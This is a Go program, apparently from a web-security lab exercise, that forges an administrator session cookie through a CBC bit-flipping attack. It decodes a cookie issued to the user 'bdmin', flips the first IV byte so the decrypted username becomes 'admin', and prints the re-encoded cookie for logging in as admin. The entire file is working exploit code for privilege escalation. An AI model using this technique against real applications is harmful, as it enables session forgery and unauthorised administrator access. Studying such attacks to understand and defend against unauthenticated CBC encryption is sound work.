package main

import (
	"encoding/base64"
	"fmt"
	"net/url"
)

func main() {
	// get cookie from "bdmin" login
	cookie := "PGEgcZrd4PJBv%2BOa0tnueQBX7y%2B4IPFR"
	// url decode
	cookie, err := url.QueryUnescape(cookie)
	if err != nil {
		fmt.Println("error:", err)
	}
	// base64 decode
	decoded, err := base64.StdEncoding.DecodeString(cookie)
	if err != nil {
		fmt.Println("error:", err)
	}
	// first byte of the IV
	ivByte := decoded[0]
	// compute new IV value
	xorAB := byte('a') ^ byte('b')
	ivNew := xorAB ^ ivByte
	// replace first byte of IV with new value to force "admin"
	tmp := make([]byte, len(decoded))
	copy(tmp, decoded)
	tmp[0] = ivNew
	// compare what's changed
	fmt.Println("[*] Diff original vs modified cookie value:")
	fmt.Printf("%x\n", decoded)
	fmt.Printf("%x\n", tmp)
	// convert back to base64 and url encode
	cookieNew := url.QueryEscape(base64.StdEncoding.EncodeToString(tmp))
	fmt.Println("[*] New encoded cookie value to login as admin:")
	fmt.Println(cookieNew)
}
